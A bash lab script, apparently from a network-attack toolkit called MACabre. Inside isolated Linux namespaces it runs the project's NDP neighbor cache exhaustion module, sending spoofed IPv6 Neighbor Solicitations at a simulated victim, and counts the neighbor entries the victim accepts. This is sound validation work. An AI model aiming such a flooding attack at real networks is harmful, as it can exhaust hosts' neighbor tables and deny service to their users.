#!/usr/bin/env bash
# Isolated NDP neighbor cache exhaustion lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge:
#
#   victim:   a host at VICTIM_ADDR. Its neighbor cache is the one being filled.
#   attacker: a host that sends Neighbor Solicitations with MACabre's module, each from a new source
#             address inside PREFIX (SOURCE_BASE and up), with the attacker's MAC as the source option.
#
# Phases:
#   Phase 1 (control): no solicitation has been sent. The victim's cache holds no entry for the sources.
#            If it already has some, the lab cannot tell anything and exits 2.
#   Phase 2 (attack): the attacker sends SOLICITATIONS solicitations. The victim must create an entry for
#            at least MIN_ENTRIES of the spoofed sources.
#
# The lab prints how many spoofed entries the victim created, and the kernel's neighbor table limit
# (gc_thresh3) for the victim, which is the size at which the kernel starts removing entries. The
# attack's effect depends on that limit; this lab does not reach it, so it measures acceptance only.
#
# Exit 0 when the control holds and the victim created at least MIN_ENTRIES entries. Exit 1 when it did
# not. Exit 2 when the control failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/ndp_neighbor_cache_exhaustion_lab.sh
#
# Requirements: iproute2 (ip) with IPv6 enabled in the kernel, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

if ! command -v ip >/dev/null 2>&1; then
    echo "Missing required tool: ip" >&2
    exit 1
fi

if [[ ! -e /proc/sys/net/ipv6 ]]; then
    echo "This lab needs IPv6 in the kernel." >&2
    exit 1
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
PREFIX="2001:db8:c0::/64"
VICTIM_ADDR="2001:db8:c0::1"
ATTACKER_ADDR="2001:db8:c0::3"
VICTIM_MAC="02:00:00:00:10:02"
ATTACKER_MAC="02:00:00:00:10:03"
SOLICITATIONS=200
MIN_ENTRIES=150
# Sources are 2001:db8:c0::1000 and up (module offset 0x1000). Entries match 2001:db8:c0::10xx.
SOURCE_MATCH='^2001:db8:c0::10[0-9a-f]{2} '

stop_lab() {
    for ns in lan victim attacker; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

stop_lab

ip netns add lan
ip netns add victim
ip netns add attacker

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up

# attach_host NAME NAMESPACE MAC IPV6: one veth from the bridge into the namespace, with a static address.
attach_host() {
    local name="$1" ns="$2" mac="$3" addr="$4"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
    ip netns exec "$ns" ip -6 addr add "$addr/64" dev "h-$name" nodad
}

attach_host vic victim "$VICTIM_MAC" "$VICTIM_ADDR"
attach_host atk attacker "$ATTACKER_MAC" "$ATTACKER_ADDR"

SEND_CODE='
import sys, threading
from macabre.attacks.ndp_neighbor_cache_exhaustion import NdpNeighborCacheExhaustionConfig, run_ndp_neighbor_cache_exhaustion
stats = run_ndp_neighbor_cache_exhaustion(
    NdpNeighborCacheExhaustionConfig(iface=sys.argv[1], source_mac=sys.argv[2], target=sys.argv[3], prefix=sys.argv[4], count=int(sys.argv[5])),
    threading.Event(), lambda _s: None,
)
print(stats.frames)
'

# Counts neighbor entries on the victim whose address is one of the spoofed sources.
spoofed_entries() {
    ip netns exec victim ip -6 neigh show dev h-vic 2>/dev/null | grep -cE "$SOURCE_MATCH" || true
}

echo "Phase 1: control, no Neighbor Solicitation sent"
sleep 1
BASE="$(spoofed_entries)"
echo "  spoofed-source entries in the victim's neighbor cache: $BASE"
echo

echo "Phase 2: attacker sends $SOLICITATIONS Neighbor Solicitations, each from a new source in $PREFIX, with MACabre's module"
SENT="$(ip netns exec attacker env PYTHONPATH="$ROOT/src" "$PY" -c "$SEND_CODE" h-atk "$ATTACKER_MAC" "$VICTIM_ADDR" "$PREFIX" "$SOLICITATIONS" 2>/dev/null || echo 0)"
echo "  solicitations sent: $SENT"
sleep 3
AFTER="$(spoofed_entries)"
GC="$(ip netns exec victim cat /proc/sys/net/ipv6/neigh/default/gc_thresh3 2>/dev/null || echo unknown)"
TOTAL="$(ip netns exec victim ip -6 neigh show dev h-vic 2>/dev/null | wc -l)"
echo "  spoofed-source entries in the victim's neighbor cache: $AFTER"
echo "  total neighbor entries on the victim: $TOTAL (kernel gc_thresh3: $GC)"
echo

if [[ "$BASE" != "0" ]]; then
    echo "Control: the victim already had spoofed-source entries before the attack. Result unreliable."
    exit 2
fi
if [[ "$AFTER" -ge "$MIN_ENTRIES" ]]; then
    echo "Result: the victim created $AFTER neighbor entries for spoofed sources from $SENT solicitations. Vulnerable: each unauthenticated solicitation takes a slot in the neighbor cache. Whether the table limit is reached is not measured here."
    exit 0
fi
echo "Result: the victim created only $AFTER entries for spoofed sources (expected at least $MIN_ENTRIES). Not validated."
exit 1
